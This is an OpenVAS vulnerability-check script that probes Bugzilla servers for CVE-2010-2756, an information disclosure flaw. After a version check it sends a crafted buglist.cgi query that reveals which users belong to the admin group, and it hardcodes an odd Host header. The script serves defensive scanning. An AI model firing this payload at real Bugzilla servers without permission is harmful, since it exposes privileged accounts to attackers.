###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_bugzilla_info_disclosure_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Bugzilla Informaton Disclosure Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allows attackers to search for bugs that were
  reported by users belonging to one more groups.
  Impact Level: Application";
tag_affected = "Bugzilla 2.19.1 to 3.2.7, 3.3.1 to 3.4.7, 3.5.1 to 3.6.1 and 3.7 to 3.7.2";
tag_insight = "The flaw is due to an error in 'Search.pm' which allows remote attackers
  to determine the group memberships of arbitrary users via vectors involving the
  Search interface, boolean charts, and group-based pronouns.";
tag_solution = "Upgrade to Bugzilla version 3.2.8, 3.4.8, 3.6.2 or 3.7.3
  For updates refer to http://www.bugzilla.org/download/";
tag_summary = "This host is running Bugzilla and is prone to information
  disclosure vulnerability.";

if(description)
{
  script_id(801570);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-01-20 07:52:11 +0100 (Thu, 20 Jan 2011)");
  script_cve_id("CVE-2010-2756");
  script_bugtraq_id(42275);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Bugzilla Informaton Disclosure Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/41128");
  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2010/2205");
  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2010/2035");
  script_xref(name : "URL" , value : "http://www.vupen.com/english/advisories/2010/2035");
  script_xref(name : "URL" , value : "https://bugzilla.mozilla.org/show_bug.cgi?id=417048");

  script_description(desc);
  script_summary("Determine the informaton disclosure vulnerability in Bugzilla");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("bugzilla_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port)){
  exit(0);
}

## Get the version
vers = get_kb_item("www/" + port + "/bugzilla/version");
if(!vers){
 exit(0);
}

## check for  only vuln versions
if(version_in_range(version:vers, test_version: "3.7", test_version2:"3.7.2")||
   version_in_range(version:vers, test_version: "3.5.1", test_version2:"3.6.1")||
   version_in_range(version:vers, test_version: "3.3.1", test_version2:"3.4.7")||
   version_in_range(version:vers, test_version: "2.19.1", test_version2:"3.2.7"))
{
  ## get the installed path
  dir = get_dir_from_kb(port:port,app:"bugzilla");
  if(dir)
  {
    ## Construct the exploit string
    exploit = "/buglist.cgi?query_format=advanced&bug_status=CLOSED&" +
              "field0-0-0%3Dreporter%26type0-0-0%3Dequals%26value0-0-0"+
              "%3D%25group.admin%25";

    ## Construct the request
    req = string("GET ", dir, exploit, " HTTP/1.1\r\n",
                 "Host: 209.132.180.131\r\n",
                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                 "Accept-Language: en-us,en;q=0.5\r\n",
                 "Accept-Encoding: gzip,deflate\r\n",
                 "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
                 "Keep-Alive: 300\r\n",
                 "Connection: keep-alive\r\n\r\n");

    resp = http_keepalive_send_recv(port:port, data:req);
    if(resp)
    {
       ## Check for the exploit
       if(eregmatch(pattern:"field0-0-0%3Dreporter%26type0-0-0%3Dequals%26value0-0-0%3D%25group.admin%25/i",
                    string:resp, icase:TRUE)){
         security_warning(port:port);
       }
    }
  }
}
